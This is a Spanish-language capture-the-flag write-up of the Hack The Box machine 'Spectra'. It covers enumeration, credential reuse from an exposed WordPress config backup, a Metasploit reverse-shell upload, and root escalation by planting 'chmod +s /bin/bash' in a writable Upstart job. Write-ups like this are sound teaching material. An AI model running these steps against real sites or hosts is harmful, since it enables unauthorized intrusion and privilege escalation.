# SPECTRA HTB

![logo](logo.png "Logo")

## ENUMERACION

```
nmap -p- --open -T5 -v -n -oG allPorts 10.10.10.229

-p- 		todos los puertos
--open 		solo los abiertos
-T5			forma rápida de escanear
-v			verbose (avisa ni bien encuentra un puerto)
-n			no realiza la resolucion DNS
-oG			exportar en formato grepeable
allPorts	nombre del archivo
```

filtramos los puertos con extracPorts

```
extractPorts allPorts
```

![ports](ports.png "Ports")

Obtenemos los puertos en la clip board (22,80,3306,8081), ahora realizamos un descubrimiento de servicios en los puertos:

```
nmap -p22,80,3306,8081 -sS -sC -sV 10.10.10.229 -oN targeted
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-13 21:02 -04
Nmap scan report for spectra.htb (10.10.10.229)
Host is up (0.14s latency).

PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http             nginx 1.17.4
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql            MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
8081/tcp open  blackice-icecap?
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Fri, 14 May 2021 01:07:06 GMT
|     Connection: close
|     Hello World
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Fri, 14 May 2021 01:07:12 GMT
|     Connection: close
|_    Hello World
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8081-TCP:V=7.91%I=7%D=5/13%Time=609DCC0F%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,71,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain\r\nD
SF:ate:\x20Fri,\x2014\x20May\x202021\x2001:07:06\x20GMT\r\nConnection:\x20
SF:close\r\n\r\nHello\x20World\n")%r(FourOhFourRequest,71,"HTTP/1\.1\x2020
SF:0\x20OK\r\nContent-Type:\x20text/plain\r\nDate:\x20Fri,\x2014\x20May\x2
SF:02021\x2001:07:06\x20GMT\r\nConnection:\x20close\r\n\r\nHello\x20World\
SF:n")%r(HTTPOptions,71,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/p
SF:lain\r\nDate:\x20Fri,\x2014\x20May\x202021\x2001:07:12\x20GMT\r\nConnec
SF:tion:\x20close\r\n\r\nHello\x20World\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.90 seconds
```

* Puerto 22 ssh
* Puerto 80 pagina web
* Puerto 3306 MySQL
* 8081 en esta caso una pagina web

Veremos que tiene el puerto 8081

![Puerto 8081](8081.png)

Nada relevante, vamos por el puerto 80:

![Puerto 80](80.png)

Vemos 2 enlaces, vamos al primero porque el segundo no lleva a nada:

![Puerto 80_2](80_2.png)

Vemos que es una pagina Wordpress, a la hora de ver una pagina en este CMS debemos tener en cuenta ciertas cosas: 

Los usuarios comunes de este CMS son:

* Administrator
* Editor
* Author
* Contributor
* Subscriber

La ruta de su panel login es:

```
direccion_del_panel_wp/wp-admin.php

o

direccion_del_panel_wp/wp-admin
```

Dentro de este panel login si colocas un usuario  y una contraseña cualquiera y te indica el el usuario existe pero la contraseña es incorrecta. De esta forma podemos validar que un usuario es valido:

Ejemplo de usuario valido:

![Usuario valido](login1.png)

Ejemplo de usuario invalido:

![Usuario invalido](login2.png)

** Ver el mensaje de error del panel **

Una ruta en la que podemos obtener los usuarios existentes del CMS:

```
curl direccion_del_panel_wp/wp-json/wp/v2/users/

```

## ENUMERACION WEB

Mediante wfuzz vamos a ver si encontramos directorio en el sitio wordpress, debemos hacerla a la direccion IP del equipo

```
wfuzz -c -hc 404 -w /usr/share/dirbuster/wordlist/directory-list-2.3-medium.txt http://10.10.10.229/FUZZ

-c				formato colorizado
-hc				ocultamos el codigo de estado 404 porque no nos interesa 
-w dictionary	agregamos un diccionario
/FUZZ			es donde queremos colocar el contenido del diccionario

```

![wfuzz](wfuzz.png)

Se encuentran dos directorios, el main es la pagina wordpress. Vamos a ver que hay en testing:

![testing](testing.png)

Vemos varios archivos, el mas interesante **wp-config.php.save** ya que es un archivo de configuración, mediante curl vamos a guardar este archivo en nuestro equipo:

```
curl 10.10.10.229/testing/wp-config.php.save > wp-config.php.save
```

Al leer el archivo vemos una credenciales de base de datos:

![wp-config](wp-config.png)

Vamos a intentar conectarnos por mysql ya que vimos que el puerto 3306 estaba abierto:

```
mysql -u devtest -h 10.10.10.229 -p
```

Vemos que las credenciales no nos ayudan de mucho:

![mysql](mysql.png)

Ya que vimos que el usuario administrator es valido para wordpress, en el panel login vamos a comprobar si la contraseña del archivo es la de ese usuario:

![login_in](login_in.png)

Estamos dentro!

Eso quiere decir que tenemos unas credenciales validas:

* Ususario: Administrator
* Password: devteam01

## EXPLOTACIÓN

Vamos a usar metasploit para la explotacion, primero vamos a levantar el postgres:

```
systemctl enable --now postgresql
```

verificar estado:

```
systemctl status postgresql
```

vamos a buscar un exploit para wordpress una vez que tenemos credenciales, lo que nos interesa es obtener una shell:

```
search wordpress shell
```

![msf1](msf1.png)

El número 2 se ve interesante vamos a usarlo:

```
use exploit/unix/webapp/wp_admin_shell_upload
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

show options

set lhost HTB_IP

set username Administrator

set password devteam01

set rhost 10.10.10.229

set rport 80

set targeturi /main

run

```

![msf2](msf2.png)

vemos que ingresamos como el usuario nginx

vamos a ver a que directorios nos podemos dirigir una vez dentro:

![directory_linux](directory_linux.jpg)

Nos dirigimos a la ruta /opt y vemos un archivo llamado **autologin.conf.orig**

```
cat /opt/autologin.conf.orig
```

![msf3](msf3.png)

En el contenido de este archivo vemos algunas rutas de archivos, entre ellas uno que llama la atencion que es el **/etc/autologin**, vamos a ver que es ese fichero:

```
cd /etc/autologin
ls
cat passwd
```

![msf4](msf4.png)

Vemos una contraseña **SummerHereWeCome!!**, recordemos que el puerto 22 (SSH) estaba abierto asi que veamos si podemos leer el archivo /etc/passwd para ver que usuarios hay aparte de nginx:

```
cat /etc/passwd
```

![msf5](msf5.png)

Vemos el usuario katie y root, no fue la contraseña de root asi que probemos una conexion por ssh con el otro usuario:

* usuario: katie
* password: SummerHereWeCome!!

Y estamos dentro via ssh con el usuario katie:

```
ssh katie@10.10.10.229
```

![sh_connection](sh_connection.png)

Ya podemos ver la flag user.txt

## ESCALADA DE PRIVILEGIOS

Es hora de esaclar privilegios, vamos a ver la lista de los comandos que puede realizar este usuario junto a sudo:

```
sudo -l
```

![sudo](sudo.png)

vemos que podemos ejecutar /sbin/initctl.

Initctl, independientemente de la ruta donde se encuentre, se utiliza para administrador comunicarse e interactuar con el demonio _init_ de Upstar tubicado en la ruta /etc/init.

Upstart es el método utilizado por varios sistemas operativos Unix para realizar tareas durante el arranque del sistema.

En la ruta /etc/init se encuentran archivos de configuración utilizados por Upstart.  que permiten  la consulta "status" de un servicio.

Por lo que podemos ejecutar diferentes comandos:

* initctl start /etc/init/file
* initctl stop /etc/init/file
* initctl restart /etc/init/file
* initctl reload /etc/init/file
* initctl list /etc/init/file
* initctl show-config /etc/init/file
* initctl check-config /etc/init/file

entonces vamos a ver que archivos hay en la ruta **/etc/init**:

```
cd /etc/init
ls -la
```

![init](init.png)

Vemos muchos archivos, primero vamos a ver en que grupos esta el usuario katie para saber cuales de estos archivos podemos editar:

```
id
```

![[Pasted image 20210514160512.png]]

Katie pertenece a los grupos katie y developers, vamos afiltrar los archivos en los que el grupo son developers:

```
ls -la | grep developers
```

![[Pasted image 20210514160711.png]]

Cualquiera de estos archivos tiene permisos de escritura para los usuarios del grupo developers (el grupo al que petenece katie). Veamos el contenido del primero:

```
cat test.conf
```

![[Pasted image 20210514160851.png]]

Dentro de las palabras clave **script** y **end script** se escriben comandos que se ejecuta cuando se levanta el archivo mediante el uso de initctl, entonces antes de editar este archivo vamos a para este servicio para que tomen efecto los cambios:

```
sudo /sbin/initctl stop test
```

Lo hacemos con sudo porque nos lo mostro el comando **sudo -l**

![[Pasted image 20210514161303.png]]

Ese mensaje sale porque ya esta abajo, en todo caso saldria que el servicio se esta deteniendo si es que estuviera levantado. 

Editamos el contenido del archivo **/etc/init/test.conf**, agregamos lo siguiente:

```
script

chmod +s /bin/bash

end script
```

Lo que hacemos es agregarle el permiso SUID a /bin/bash, de modo que cualquier usuario que ejecute una /bin/bash con la flag -p nos abrira una bash como el usuario root

Levantamos el servicio test:

```
sudo /sbin/initctl start test
```

Y abrimos nuestra shell:

```
/bin/bash -p
```

![[Pasted image 20210514162734.png]]

Ya podemos ver la flag root.txt